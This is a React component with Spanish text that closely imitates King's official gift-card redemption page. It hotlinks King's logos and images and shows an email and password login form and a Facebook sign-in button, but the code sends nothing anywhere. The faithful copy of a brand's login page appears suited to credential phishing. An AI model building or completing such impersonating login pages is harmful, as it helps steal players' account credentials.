import React, { useState } from "react";
import "./redeem.css";

function Redeem(){

const steps = [
"Iniciar sesión",
"Canjear tarjeta de regalo",
"Disfruta de recompensas"
];

const faqs = [
{
q:"No sé si tengo una cuenta de King ni dónde puedo encontrar las credenciales que utilicé. ¿Cómo puedo comprobarlo?",
a:"Puedes verificarlo desde el menú de cuenta dentro del juego."
},
{
q:"Ingresé con una cuenta de Apple. ¿Cómo puedo canjear una tarjeta de regalo?",
a:"Debes iniciar sesión con la misma cuenta."
},
{
q:"¿Cómo puedo crear una cuenta de King?",
a:"Puedes crear una cuenta directamente desde el juego."
},
{
q:"¿Cómo puedo cambiar la contraseña de mi cuenta de King?",
a:"Puedes cambiarla desde la configuración."
}
];

const [form,setForm] = useState({
email:"",
password:""
});

const [showPassword,setShowPassword] = useState(false);
const [open,setOpen] = useState(null);

function handleChange(e){
setForm({
...form,
[e.target.name]:e.target.value
});
}

return(

<div>

<header className="header">
<img src="https://redeem.king.com/images/kingLogoRebrand.svg"/>
</header>

<div className="container">

<img
className="character"
src="https://redeem.king.com/images/tiffyCandyPile/tiffyCandyPile.webp"
/>

<div className="card">

<h1>Canjea la tarjeta de regalo.</h1>

<div className="progress">

{steps.map((step,index)=>(

<div key={index} className="progress-step">

<div className="heart">{index+1}</div>

<p>{step}</p>

</div>

))}

</div>

<h2>
Ingresa a tu cuenta de
<span className="king-text"> King </span>
para canjear la tarjeta de regalo.
</h2>

<input
name="email"
placeholder="Correo"
value={form.email}
onChange={handleChange}
/>

<div className="password">

<input
type={showPassword ? "text" : "password"}
name="password"
placeholder="Contraseña"
value={form.password}
onChange={handleChange}
/>

<span
className="eye"
onClick={()=>setShowPassword(!showPassword)}
>
👁
</span>

</div>

<p className="forgot">
¿OLVIDASTE LA CONTRASEÑA?
</p>

<button className="login-btn">
INGRESAR
</button>

<div className="or">o</div>

<button className="facebook">
Continuar con Facebook
</button>

<p>Al entrar a este sitio web confirmas que aceptas nuestros Condiciones de servicio y que leíste nuestra Política de privacidad.</p>


<div className="container2">
   
   <img
className="character2"
src="https://redeem.king.com/images/tiffyDoubt/tiffyDoubt.webp"
/>
<p><b>¿No sabes si tienes una cuenta de King? ¡Descúbrelo!</b>
<br/>
<h5>Abre el juego → Toca el ícono de engranaje (⚙️) de la esquina superior derecha → Selecciona "Cuenta y ayuda" → "Mi cuenta".</h5>
<br/>
<h5>Si puedes ver tu avatar, tu dirección de correo electrónico o el inicio de sesión de Facebook/Apple, ya tienes una cuenta de King. En caso contrario, tienes que registrarte en la misma página. Asegúrate de usar las mismas credenciales.</h5></p>
</div>
</div>

</div>

<div className="faq-card">

<h2 className="faq-title">
Preguntas frecuentes
</h2>

{faqs.map((item,index)=>(

<div
key={index}
className="faq-item"
onClick={()=>setOpen(open===index?null:index)}
>

<div className="faq-question">

{item.q}

<span>+</span>

</div>

{open===index && (

<p className="faq-answer">
{item.a}
</p>

)}

</div>

))}

</div>

<div className="help-card">

<div>

<h2>¿Tienes alguna pregunta?</h2>

<button className="help-btn">
VISITA EL CENTRO DE AYUDA
</button>
 <img className="btn-img2" 
 src="https://redeem.king.com/images/help-center-characters.png"  />
</div>

</div>

<footer className="footer">

<div className="wave"></div>

<img src="https://redeem.king.com/images/kingLogoRebrand.svg"/>

<p>Contáctanos</p>
<p>Términos y condiciones</p>
<p>Política de privacidad</p>
<p>No vender ni compartir mi información personal</p>
<p>Aviso de privacidad de California</p>

<p className="copy">
© 2026 King.com Ltd., King, el logotipo de la corona de King, los títulos de juegos y las marcas relacionadas son marcas 
<br />
 registradas de King.com Ltd. y de sus respectivas empresas. Todos los derechos reservados.
</p>

</footer>

</div>

);
}

export default Redeem;